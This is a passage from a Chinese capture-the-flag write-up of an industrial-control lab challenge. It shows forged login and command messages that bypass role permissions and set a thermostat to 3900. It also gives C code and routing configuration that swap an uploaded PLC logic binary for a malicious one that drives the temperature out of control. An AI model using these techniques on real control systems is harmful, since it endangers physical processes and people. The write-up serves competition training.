d></tr></tbody></table><p>对上面的描述进行阅读理解，形成一个表格（byd这几句话真给我cpu干烧了）</p><table><thead><tr><th></th><th>登录操作员站</th><th>登录监视终端</th><th>登录工程师站</th><th>操作员站调节温度</th><th>监视终端调节温度</th><th>代码上传和逻辑上传</th></tr></thead><tbody><tr><td>工程师</td><td>√</td><td>√</td><td>√</td><td></td><td></td><td>√</td></tr><tr><td>操作员</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>监视员</td><td>√</td><td>√</td><td>√</td><td></td><td>√</td><td></td></tr></tbody></table><p>那么，违规的情况就是：</p><p>工程师站：</p><ul><li>操作员执行文件上传</li><li>监视员执行文件上传</li></ul><p>操作员站：</p><ul><li>工程师执行调节温度</li><li>监视员执行调节温度</li></ul><p>监视终端：</p><ul><li>操作员执行调节温度</li><li>工程师执行调节温度</li></ul><p>于是就能开始改文件了，用户名见<a href="#user.list">user.list</a></p><p>attack_login1.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd1.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_login2.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"sun:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd2.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span><span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"sun"</span><span class="token punctuation">,</span><span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112158556.png" alt="image-20240713112158556"></p><p>attack_login3.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"sun:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd3.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"sun"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_login4.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd4.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112608105.png" alt="image-20240713112608105"></p><p>attack_login5.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd5.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_login6.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attack_cmd6.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112954670.png" alt="image-20240713112954670"></p><hr><h3 id="恶意逻辑"><a href="#恶意逻辑" class="headerlink" title="恶意逻辑"></a>恶意逻辑</h3><p>本任务显示攻击者通过用恶意逻辑替代正常逻辑对系统进行攻击的行为。</p><p>在<code>logic/hack_logic</code>中，设置了恶意的温度逻辑，在10秒后将始终保持设置温度档位为最高档。这里hack_logic没有列在security的makefile中，需要单独编译，编译后，我们可以看到目录下会出现一个 libthermostat_logic.so 文件，这个文件是用来冒充合法逻辑的恶意逻辑文件。</p><blockquote><p>请为<code>file_replace</code>模块<strong>填充文件替换代码</strong>，并通过修改模块配置文件和切面路由文件，拦截工程师站到plc的二进制逻辑文件传输过程(bin_upload路由），使得file_replace模块在合适位置发挥作用，将所传输的libthermostat_logic.so文件内容替换为hack_logic目录下的同名文件，从而导致系统运行一段时间后温度失控。</p></blockquote><p>可以用<code>task_2_2_1.sh</code>脚本测试二进制逻辑上传过程，用<code>task_2_2_2.sh</code>脚本测试逻辑运行情况，该脚本启动后会5秒读一次温度状况，重复四次。</p><br><p>本题需要修改三个文件：</p><ul><li><code>file_replace.c</code> ：在收到二进制逻辑传输命令后，将正常逻辑替换成hack_logic目录下的恶意逻辑</li><li><code>plugin_config.cfg.task_2_2</code> ：在配置文件中添加file_replace模块</li><li><code>aspect_policy.cfg.task_2_2</code> ：在<code>bin_upload</code>传输过程中插入<code>file_replace</code>模块，使其可以在上传代码时用hack_logic中恶意逻辑替换合法逻辑</li></ul><p>涉及到两个模块需要接触</p><ul><li><code>file_replace</code> ：<code>2024buildup/src/security/file_replace</code>，需要编写<code>file_replace.c</code> 做到自动替换恶意模块</li><li><code>hack_logic </code>：<code>2024buildup/src/logic/hack_logic</code></li></ul><p>手册的可读性太差，直接跑一个task_2_2_1.sh看看其日志文件再对着改</p><p>观察src&#x2F;system&#x2F;logic_upload&#x2F;logic_upload.c的行为，看看是否有攻击的切入点</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120324134.png" alt="image-20240713120324134"></p><p>在这个地方完成了文件的复制，然后再也没管过，也没有任何的校验措施。后续是连着文件名一起发了过去的，如果能对这个文件名指向的文件进行覆写应该就能成了</p><p>src&#x2F;security&#x2F;file_replace&#x2F;file_replace.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">bin_file_replace</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> sub_proc<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span> recv_msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> type<span class="token punctuation">;</span>        <span class="token keyword">int</span> subtype<span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">int</span> ret<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_UPLOAD<span class="token punctuation">)</span> <span class="token operator">*</span> bin_upload<span class="token punctuation">;</span>        ret<span class="token operator">=</span><span class="token function">message_get_record</span><span class="token punctuation">(</span>recv_msg<span class="token punctuation">,</span><span class="token operator">&amp;</span>bin_upload<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ret<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> ret<span class="token punctuation">;</span>        <span class="token comment">// 在这里添加文件替换代码</span>        <span class="token keyword">void</span><span class="token operator">*</span> c<span class="token operator">=</span><span class="token function">message_clone</span><span class="token punctuation">(</span>recv_msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_UPLOAD<span class="token punctuation">)</span> <span class="token operator">*</span> logic_upload<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_CODE<span class="token punctuation">)</span> <span class="token operator">*</span> logic_code<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_BIN<span class="token punctuation">)</span> <span class="token operator">*</span> logic_bin<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_RETURN<span class="token punctuation">)</span> <span class="token operator">*</span> logic_return<span class="token punctuation">;</span>        MSG_EXPAND <span class="token operator">*</span> msg_expand<span class="token punctuation">;</span>        <span class="token function">message_get_record</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token operator">&amp;</span>logic_upload<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">message_remove_expand</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token function">TYPE_PAIR</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_BIN<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>msg_expand<span class="token punctuation">)</span><span class="token punctuation">;</span>        logic_bin <span class="token operator">=</span> msg_expand<span class="token operator">-></span>expand<span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span>logic_upload<span class="token operator">-></span>plc_devname<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token operator">*</span> s<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token operator">*</span> dic<span class="token operator">=</span><span class="token string">"0123456789abcdef"</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>DIGEST_SIZE<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                s<span class="token punctuation">[</span>i<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>dic<span class="token punctuation">[</span><span class="token punctuation">(</span>logic_upload<span class="token operator">-></span>uuid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                s<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>dic<span class="token punctuation">[</span>logic_upload<span class="token operator">-></span>uuid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        s<span class="token punctuation">[</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> fsrc<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/root/2024buildup/src/logic/hack_logic/libthermostat_logic.so"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token operator">*</span> fn<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Strcpy</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span><span class="token string">"logic_bin/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Strcat</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> fdst<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span>O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>len<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                ret<span class="token operator">=</span><span class="token function">write</span><span class="token punctuation">(</span>fdst<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token operator">&lt;</span><span class="token punctuation">(</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>                len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fdst<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//文件替换代码结束</span>        <span class="token function">ex_module_sendmsg</span><span class="token punctuation">(</span>sub_proc<span class="token punctuation">,</span>recv_msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后是撰写路由规则。plugin里面只需要把模块加进去即可。路由规则的话，直接跑一遍脚本然后看日志，决定在哪里搞切面。</p><p>instance&#x2F;engineer&#x2F;station&#x2F;plugin_config.cfg.task_2_2</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_send"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgfile_send"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_print"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgrecord_print"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"init_para"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token property">"mode"</span><span class="token operator">:</span><span class="token number">1</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_replace"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_replace"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>instance&#x2F;engineer&#x2F;station&#x2F;aspect_policy.cfg.task_2_2</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"policy_head"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>                <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"ASPECT"</span><span class="token punctuation">,</span>                <span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>                <span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                <span class="token property">"rjump"</span><span class="token operator">:</span><span class="token number">-2</span><span class="token punctuation">,</span>                <span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"challenge_login"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"MATCH_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                        <span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIN"</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"CONN"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"center_client"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">]</span>                <span class="token property">"response_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">&#125;</span>                <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"policy_head"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"bin_upload"</span><span class="token punctuation">,</span>                <span class="token property">"type"</span><span class="token operator">:</span><span 